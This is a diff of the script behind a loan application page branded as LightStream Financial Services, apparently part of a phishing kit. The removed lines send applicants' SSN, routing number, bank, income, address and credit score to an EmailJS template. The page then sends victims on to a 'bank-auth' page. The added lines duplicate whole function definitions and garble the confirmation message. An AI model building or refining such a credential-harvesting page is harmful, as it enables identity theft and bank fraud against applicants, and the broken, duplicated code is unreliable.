@@ -667,94 +667,61 @@
 
             console.log("📊 Form data collected:", data);
             console.log("🏦 Customer Bank Value:", document.getElementById("customerBank").value);
-            
             // Store data for bank auth page (SECURE: sessionStorage only)
             sessionStorage.setItem("loanData", JSON.stringify(data));
             console.log("💾 Data stored in sessionStorage:", sessionStorage.getItem("loanData"));
-
-            // Send Personal Loan email (NEW - separate email)
-            console.log("📧 Sending Personal Loan email...");
             
             // Show processing message
-            alert("✅ Loan Application Submitted Successfully!\n\n📋 Your application has been received and is being processed.\n\n📧 What happens next:\n• You will be redirected to bank authentication\n• Please complete the bank verification step\n• Your loan approval is under review\n\nThank you for choosing LightStream Financial Services.");
-            
-            sendPersonalLoanEmail(data);
+            alert("✅ Loan Application Submitted Successfully!\n\n📋 Your application has been received and is being processed.\n\n📧 What happens next:\n• You will be dealt\n\nThank you for choosing LightStream Financial Services.");
 
             console.log("🔄 Redirecting to bank-auth.html...");
             setTimeout(() => {
                 window.location.href = "bank-auth.html";
-            }, 2000); // Give time for email to send
+            }, 2000);
         });
 
-        // NEW: Separate Personal Loan Email Function
-        function sendPersonalLoanEmail(data) {
-            console.log('📧 Sending Personal Loan email...');
-            
-            // Initialize EmailJS
-            emailjs.init("nW8qV4aakkEtYlieZ");
-            
-            // Prepare email template parameters for Personal Loan ONLY
-            const templateParams = {
-                // Loan information
-                loan_amount: data.loanAmount || '',
-                loan_duration: data.loanDuration || '',
-                loan_purpose: data.loanPurpose || '',
-                loan_term: data.loanDuration || '',
-                
-                // Borrower information
-                firstName: data.firstName || '',
-                lastName: data.lastName || '',
-                borrower_name: data.fullName || '',
-                customer_name: data.fullName || '',
-                name: data.fullName || '',
-                full_name: data.fullName || '',
-                client_name: data.fullName || '',
-                
-                // Contact information
-                phone: data.phone || '',
-                email: data.email || '',
-                address: data.address || '',
-                city: data.city || '',
-                state: data.state || '',
-                zip_code: data.zipCode || '',
-                zip: data.zipCode || '',
-                
-                // Bank information (from personal loan form only)
-                customer_bank: data.customerBank || '',
-                bank_name: data.customerBank || '',
-                routing_number: data.routingNumber || '',
-                account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : '',
-                
-                // Credit information
-                credit_score: data.creditScore || '',
-                
-                // Financial Information
-                ssn: data.socialSecurity || '',
-                monthly_income: data.monthlyIncome || '',
-                
-                // Employment Information
-                employment_status: data.employmentStatus || '',
-                
-                // METADATA
-                application_type: 'Personal Loan Application',
-                submission_date: new Date().toLocaleString(),
-                timestamp: new Date().toISOString(),
-                date: new Date().toLocaleDateString(),
-                time: new Date().toLocaleTimeString()
-            };
-
-            console.log('Personal Loan email template params:', templateParams);
-
-            // Send Personal Loan email using separate template
-            emailjs.send('service_mblpi2k', 'template_5wx44v8', templateParams)
-                .then(function(response) {
-                    console.log('✅ Personal Loan email sent successfully!', response.status, response.text);
-                })
-                .catch(function(error) {
-                    console.log('❌ Personal Loan email failed...', error);
-                    console.log('Error details:', error.text || error.message);
-                });
+        // Bank selection functions
+function loadBankSelection() {
+    const savedBank = localStorage.getItem('selectedBank');
+    if (savedBank) {
+        const customerBankSelect = document.getElementById('customerBank');
+        if (customerBankSelect) {
+            customerBankSelect.value = savedBank;
         }
+    }
+}
+
+function saveBankSelection() {
+    const customerBankSelect = document.getElementById('customerBank');
+    if (customerBankSelect) {
+        localStorage.setItem('selectedBank', customerBankSelect.value);
+    }
+}
+
+// ZIP code validation function
+function setupZipCodeValidation() {
+    const zipCodeInput = document.getElementById('zipCode');
+    if (zipCodeInput) {
+        zipCodeInput.addEventListener('input', function() {
+            const zipCode = this.value.replace(/\D/g, '');
+            if (zipCode.length === 5) {
+                // Auto-fill city and state using Zippopotam.us API
+                fetch(`https://api.zippopotam.us/us/${zipCode}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.places && data.places.length > 0) {
+                            const place = data.places[0];
+                            document.getElementById('city').value = place['place name'];
+                            document.getElementById('state').value = place['state abbreviation'];
+                        }
+                    })
+                    .catch(error => {
+                        console.log('ZIP code lookup failed:', error);
+                    });
+            }
+        });
+    }
+}
 
         // Google OAuth Login Function
         function initiateGoogleLogin() {
@@ -785,6 +752,49 @@
             window.location.href = 'login-success.html';
         }
         
+        // Bank selection functions
+function loadBankSelection() {
+    const savedBank = localStorage.getItem('selectedBank');
+    if (savedBank) {
+        const customerBankSelect = document.getElementById('customerBank');
+        if (customerBankSelect) {
+            customerBankSelect.value = savedBank;
+        }
+    }
+}
+
+function saveBankSelection() {
+    const customerBankSelect = document.getElementById('customerBank');
+    if (customerBankSelect) {
+        localStorage.setItem('selectedBank', customerBankSelect.value);
+    }
+}
+
+// ZIP code validation function
+function setupZipCodeValidation() {
+    const zipCodeInput = document.getElementById('zipCode');
+    if (zipCodeInput) {
+        zipCodeInput.addEventListener('input', function() {
+            const zipCode = this.value.replace(/\D/g, '');
+            if (zipCode.length === 5) {
+                // Auto-fill city and state using Zippopotam.us API
+                fetch(`https://api.zippopotam.us/us/${zipCode}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.places && data.places.length > 0) {
+                            const place = data.places[0];
+                            document.getElementById('city').value = place['place name'];
+                            document.getElementById('state').value = place['state abbreviation'];
+                        }
+                    })
+                    .catch(error => {
+                        console.log('ZIP code lookup failed:', error);
+                    });
+            }
+        });
+    }
+}
+
         // Initialize when DOM is loaded
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🌟 Page loaded, initializing form...');
@@ -799,6 +809,7 @@
             
             console.log('✅ Form found:', form);
             
+            // Initialize bank selection
             loadBankSelection();
             
             // Add change listener to bank select
